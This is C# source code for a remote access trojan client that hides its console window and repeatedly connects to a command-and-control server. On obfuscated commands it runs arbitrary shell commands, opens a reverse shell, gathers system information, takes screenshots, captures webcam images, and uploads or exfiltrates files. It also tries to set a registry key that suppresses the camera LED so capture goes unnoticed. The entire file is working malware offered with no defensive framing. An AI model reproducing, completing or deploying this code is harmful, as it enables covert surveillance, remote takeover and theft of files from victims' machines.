using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.IO;
using System.Diagnostics;
using System.Drawing.Imaging;
using ScreenShotDemo;
using System.Drawing;
using SnapShot;
using System.Runtime.InteropServices;

namespace RATClient
{
    class Program
    {
        //static IPAddress CCIP = IPAddress.Parse("192.168.1.1");    //In future, read this from text file or link to attacker controlled domain
        static IPAddress CCIP = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0];
        static IPAddress localIP = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0];
        static IPEndPoint CCServ = new IPEndPoint(CCIP, 5555);
        static Boolean connected = false;
        static Socket openSock;
        static byte[] genericRecieve = Encoding.ASCII.GetBytes("♦");
        static void phoneHome()
        {
            Console.WriteLine("Contacting C&C...");
            byte[] ackBytes = new byte[3];
            Socket phoneHome = new Socket(CCIP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            while (true)
            {
                try
                {
                    phoneHome.Connect(CCServ);
                    break;
                }
                catch (Exception e)
                {
                    Console.WriteLine("Connection to CC failed. Retrying...");
                }
            }
            String message = "";
            message += (char)6;
            message += (char)4;
            String recvString = null;
            phoneHome.Send(Encoding.ASCII.GetBytes(message));

            int ackCount = phoneHome.Receive(ackBytes);
            recvString = Encoding.ASCII.GetString(ackBytes, 0, ackCount);
            while (recvString[0] != (char)6) //Keep listening until the first byte recieved is an ACK
            {
                Thread.Sleep(200); //Avoid resource hogging
                ackCount = phoneHome.Receive(ackBytes);
                recvString = Encoding.ASCII.GetString(ackBytes, 0, ackCount);
            }
            connected = true; //We've got a connection!
            openSock = phoneHome;
            idleLoop();
        }
        static void idleLoop()
        {
            Console.WriteLine("Entering idle loop...");
            while (true)
            {
                byte[] recvBytes = new byte[1024];
                Thread.Sleep(200); //Avoid resource hogging
                int byteCount = 0;
                try
                {
                    byteCount = openSock.Receive(recvBytes);
                }catch(Exception e)
                {
                    Console.WriteLine("Something's gone wrong. {0} Phoning home...",e.ToString());
                    phoneHome();
                }
                
                string recvString = Encoding.ASCII.GetString(recvBytes,0,byteCount);
                if (recvString.Trim() != null)
                {
                    receptionProcessing(recvString);
                }else
                {
                    Console.WriteLine("Something's gone wrong. Phoning home...");
                    phoneHome();
                }
                
            }
        }
        static void receptionProcessing(string recvString)
        {
            Console.WriteLine("Entered reception processing for string: {0}", recvString);

            if (recvString.StartsWith("3><3[")) //If the packet leads with 3><3[ (ooh aren't you so h4x0r), process it with exec
            {
                String issuedCommand = recvString.Substring(6);
                issuedCommand = issuedCommand.Substring(0, issuedCommand.Length - 1);
                exec(issuedCommand);
            }
            else if (recvString.StartsWith("ki||")) //If it's this, process for shutdown
            {
                shutdownProcedure();
            }
            else if (recvString.StartsWith("rev3rs3")) //if it's that, start a reverse shell
            {
                reverseShell();
            }
            else if (recvString.StartsWith("inf0")) //if it's this, get system info
            {
                getSystemInfo();
            }
            else if (recvString.StartsWith("y0ink"))
            {
                sendScreenshot();
            }
            else if (recvString.StartsWith("c4m"))
            {
                captureWebcam();
            }
            else if (recvString.StartsWith("upl04d"))
            {
                recieveFile();
            }
            else if (recvString.StartsWith("exf1l"))
            {
                exfilFile();
            }
            else
            {
                idleLoop();
            }
        }
        static void recieveFile()
        {
            openSock.Send(genericRecieve);

            //Deal with file size
            byte[] fileSizeBytes = new byte[64];
            int fileSizeDigits = openSock.Receive(fileSizeBytes);//Recieve size of file
            openSock.Send(genericRecieve);
            String fileSizeString = Encoding.ASCII.GetString(fileSizeBytes, 0, fileSizeDigits);
            long fileSize = long.Parse(fileSizeString);
            //Done dealing with file size

            //Deal with file name
            byte[] fileNameBytes = new byte[128];
            int fileNameCharacters = openSock.Receive(fileNameBytes);//Recieve Name
            openSock.Send(genericRecieve);
            String fileName = Encoding.ASCII.GetString(fileNameBytes, 0, fileNameCharacters);
            Console.WriteLine("Recieved file name " + fileName);
            //Done with that, too

            FileStream f = File.Open(fileName, FileMode.OpenOrCreate);

            //Now, deal with reception of file.

            byte[] terminator = Encoding.ASCII.GetBytes("♦♦endOfFile♦♦");
            List<byte> fileBytesList = new List<byte>();
            byte[] fileBytesArray = new byte[1024];//store a kilobyte of file at a time
            while (true)
            {
                int recievedByteCount = openSock.Receive(fileBytesArray);//recieve into fileBytesArray
                openSock.Send(genericRecieve); //ACK the chunk
                String recievedBytes = Encoding.ASCII.GetString(fileBytesArray, 0, recievedByteCount);
                if (recievedByteCount < 1024 || recievedBytes.Contains("♦♦endOfFile♦♦"))//if we see a fishy packet/one that contains the end of file identifier...
                {
                    Console.WriteLine("END OF FILE REACHED"); //DEBUGSTATEMENT
                    for (int i = 0; i < recievedByteCount; i++)
                    {
                        fileBytesList.Add(fileBytesArray[i]);//Should only add until recievedBytes, which is ideally less than 1024
                    }
                    break;
                }
                for (int i = 0; i < recievedByteCount; i++)
                {
                    fileBytesList.Add(fileBytesArray[i]);//Adds all 1024 bytes
                }
            }
            foreach(byte b in terminator)
            {
                fileBytesList.RemoveAt(fileBytesList.ToArray().Length-1); //Remove the file terminator from the file
            }
            openSock.Send(genericRecieve); //Sends final confirmation
            f.Write(fileBytesList.ToArray(), 0, ((int)fileSize - terminator.Length));//write out the file
            f.Close();
        }
        static void reverseShell()
        {
            Console.WriteLine("Spinning up reverse shell...");
            Process shell = new Process();
            shell.StartInfo.RedirectStandardError = true;
            shell.StartInfo.RedirectStandardOutput = true;
            shell.StartInfo.RedirectStandardInput = true;
            shell.StartInfo.UseShellExecute = false;
            shell.StartInfo.FileName = "cmd.exe";
            shell.Start();
            StreamReader stdout = shell.StandardOutput;
            StreamReader stderr = shell.StandardError;
            StreamWriter stdin = shell.StandardInput;
            while (true)
            {
                char readchr;
                String output = "";
                while (true)
                {
                    readchr = (char)stdout.Read();
                    if (stdout.Peek() == -1 && readchr == '>')
                    {
                        break;
                    }
                    output += readchr;

                }
                output += (char)4;
                byte[] outputBytes = Encoding.ASCII.GetBytes(output);
                openSock.Send(outputBytes);
                byte[] command = new byte[1024];
                int bytecount = openSock.Receive(command);
                String cmd = Encoding.ASCII.GetString(command, 0, bytecount);
                if (cmd.ToLower() == "exit")
                {
                    shell.Kill();
                    break;
                }
                stdin.WriteLine(cmd);
            }
            Console.WriteLine("Spinning down reverse shell...");
        }
        static void shutdownProcedure()
        {
            packAndSend("Shutdown Confirmed.");
            Environment.Exit(0xdead);
        }
        static void getSystemInfo()
        {
            String outString = "";
            outString += "Executable Location:      "+Environment.CommandLine+"\n";
            outString += "64 bit system?:           " + Environment.Is64BitOperatingSystem + "\n";
            outString += "Version:                  " + Environment.OSVersion + "\n";
            outString += "Domain:                   " + Environment.UserDomainName + "\n";
            outString += "Running as User:          " + Environment.UserName + "\n";
            outString += "Logical Drives:         \n";
            foreach(String drive in Environment.GetLogicalDrives())
            {
                outString += "                          "+drive+"\n";
            }
            packAndSend(outString);
        }
        static void packAndSend(object toSend)
        {
            string sendString = toSend.ToString();
            Console.WriteLine("Pack and send deployed on: {0}", sendString);
            sendString += (char)4; //The pack part of pack and send: Append an EOF byte
            byte[] sendBytes = Encoding.ASCII.GetBytes(sendString);
            openSock.Send(sendBytes);
        }
        static void exec(String command)
        {
            Console.WriteLine("Exec processing command: {0}", command);
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;
            startInfo.Arguments = "/C "+command;
            process.StartInfo = startInfo;
            process.Start();
            String stdOut = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            //Now that we have that, send it
            Thread execDataThread = new Thread(new ParameterizedThreadStart(packAndSend));
            execDataThread.Start(stdOut);
        }
        static void sendScreenshot()//very very slight memory leak here...
        {
            Console.WriteLine("Running screenshot sender...");
            ScreenCapture sc = new ScreenCapture();
            Image img = sc.CaptureScreen();
            Console.WriteLine("screenshot saved.");
            if(img == null)
            {
                Console.WriteLine("Image is null!");
            }
            ImageConverter imageConverter = new ImageConverter();
            byte[] imageBytes = (byte[])imageConverter.ConvertTo(img, typeof(byte[]));
            Console.WriteLine("Starting screenshot send...");
            openSock.Send(imageBytes);
            Console.WriteLine("Send completed.");
            img.Dispose();
        }
        static void captureWebcam()
        {
            //try to modify the camera registry key to avoid that annoying popup. This requires admin rights on the process.
            try
            {
                string regPath = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\OEM\\Device\\Capture";
                Microsoft.Win32.Registry.SetValue(regPath, "NoPhysicalCameraLED", 0);
            }
            catch
            {
                Console.WriteLine("Regedit failed pending elevation");
            }

            int VIDEODEVICE = 0; // zero based index of video capture device to use
            int VIDEOWIDTH = 640; // Depends on video device caps
            int VIDEOHEIGHT = 480; // Depends on video device caps
            short VIDEOBITSPERPIXEL = 24; // BitsPerPixel values determined by device
            System.Windows.Forms.PictureBox dummy = null; //Used to block an ActivePlayer window from popping
            Capture cam = new Capture(VIDEODEVICE, VIDEOWIDTH, VIDEOHEIGHT, VIDEOBITSPERPIXEL, dummy); //Capture has been very delicately re-worked for this process.
            IntPtr m_ip = IntPtr.Zero;
            if (m_ip != IntPtr.Zero)//Verify that we're zeroed out on our waiting IntPtr, and if we're not, free it with the marshall.
            {
                Marshal.FreeCoTaskMem(m_ip);
                m_ip = IntPtr.Zero;
            }


            m_ip = cam.Click();  //check click method in capture for forms functions [Done, clean]. 
                                 //This used to open a window for capture, but with new Capture.cs it's not anymore

            Bitmap b = new Bitmap(cam.Width, cam.Height, cam.Stride, PixelFormat.Format24bppRgb, m_ip); //get bitmaps

            b.RotateFlip(RotateFlipType.RotateNoneFlipY); //flip and rotate the resulting image

            var stream = new MemoryStream(); //define a memory stream for use in translation to byte[] for transmit

            b.Save(stream, System.Drawing.Imaging.ImageFormat.Png);  //save b into a memory stream


            //b.Save("debug.bmp");//Save for debugging

            byte[] byteArray = stream.ToArray();  //obtain byte[] from memory stream for transmit

            Console.WriteLine("starting image send");
            openSock.Send(byteArray);
            Console.WriteLine("image send complete");
            

            stream.Dispose(); //dispose of the stream

            cam.Dispose(); //dispose of the camera

            Marshal.FreeCoTaskMem(m_ip); //free the int pointer

        }
        static void exfilFile()
        {
            Console.WriteLine("Exfiltration start");
            byte[] confBytes = new byte[1]; //Create an array to store confirmation bytes
            openSock.Send(genericRecieve); //send a generic recieve packet to kick off the CC process
            Console.WriteLine("Generic recieve sent");
            Console.WriteLine("Awaiting path bytes...");
            byte[] filePathBytes = new byte[1024]; //Set up a byte array for file path (max 1024 characters, maybe overkill)
            int filePathLen = openSock.Receive(filePathBytes);//recieve the full file path
            String filePath = Encoding.ASCII.GetString(filePathBytes, 0, filePathLen); //Translate it to a string
            Console.WriteLine("Path bytes recieved: {0}", filePath);
            String fileName = filePath.Split('\\')[filePath.Split('\\').Length-1]; //Split it at backslashes to get the file name
            byte[] fileNameBytes = Encoding.ASCII.GetBytes(fileName); //Encode that to a byte array
            openSock.Send(fileNameBytes); //Pass that over the wire
            Console.WriteLine("Sent file name: {0}", fileName);
            openSock.Receive(confBytes); //Wait for confirmation bytes
            Console.WriteLine("Confirmation recieved for file name.");


            Console.WriteLine("Started population of file bytes");
            //Borrowed code from file infiltration
            List<byte> fileBytes = new List<byte>();
            try
            {
                FileStream f = File.Open(filePath, FileMode.Open);
                while (f.Length != f.Position)
                {
                    fileBytes.Add((byte)f.ReadByte());
                }
                f.Close();
                byte[] terminator = Encoding.ASCII.GetBytes("♦♦endOfFile♦♦");
                foreach (byte b in terminator)
                {
                    fileBytes.Add(b);
                }
                Console.WriteLine("File bytes ready to send");
                byte[] lengthString = Encoding.ASCII.GetBytes(fileBytes.ToArray().LongLength.ToString()); //set the bytes tp length long value as a string
                openSock.Send(lengthString); //Send that
                Console.WriteLine("Sent file length of {0} bytes", fileBytes.ToArray().LongLength.ToString());
                openSock.Receive(confBytes);//wait for a confirmation
                Console.WriteLine("Recived confirmation bytes for file length");


                Console.WriteLine("Starting sending of 1kb file chunks...");
                //send CC file bytes
                byte[] fileChunk = new byte[1024]; //prepare a 1kb buffer to store blocks of the file
                byte[] fileByteArray = fileBytes.ToArray(); //ALL the file bytes
                int iterator = 0; //An iterator for the while loop
                bool breakFlag = false; //A flag to break out of the for loop
                Console.Write("Looping over file bytes");
                while (true)
                {
                    Console.Write(".");

                    for (int i = 0; i < 1024; i++)//Fill up a file chunk
                    {
                        try
                        {
                            fileChunk[i] = fileByteArray[iterator * 1024 + i];//Fill in a file chunk with data
                        }
                        catch//if this trips, we read a have a null access exception which means we're at the end of fileByteArray
                        {
                            Console.WriteLine("\nLast chunk tripped");
                            breakFlag = true;//set the flag to break out of the outer while loop
                            byte[] runtFileChunk = new byte[i];//define a shorter bytearray to hold the ending
                            for (int j = 0; j < i; j++)
                            {
                                runtFileChunk[j] = fileChunk[j];//populate it
                            }
                            Console.WriteLine("Sending last chunk");
                            openSock.Send(runtFileChunk);//send it
                            openSock.Receive(confBytes);
                            Console.WriteLine("recieved confirmation of last chunk.");
                            break; //break out of for loop
                        }

                    }
                    if (breakFlag)
                    {
                        break;
                    }
                    openSock.Send(fileChunk); //send the full 1024 byte file chunk
                    openSock.Receive(confBytes);
                    iterator++; //Don't forget this you fuckin toolbag
                }
                Console.WriteLine("Reception loop broken");
                openSock.Receive(confBytes);
                Console.WriteLine("Last confirm recieved. File upload success.");

            }
            catch
            {
                byte[] errBytes = Encoding.ASCII.GetBytes("fileError♦");
                try
                {
                    openSock.Send(errBytes);
                }catch
                {
                    Console.WriteLine("Connection lost with remote host");
                }
                
            }
            

        }

        //Imports for hiding of console window
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            // Show
            //ShowWindow(handle, SW_SHOW);
            Thread t = new Thread(phoneHome);
            t.Start();
            Console.ReadLine();
        }
    }
}
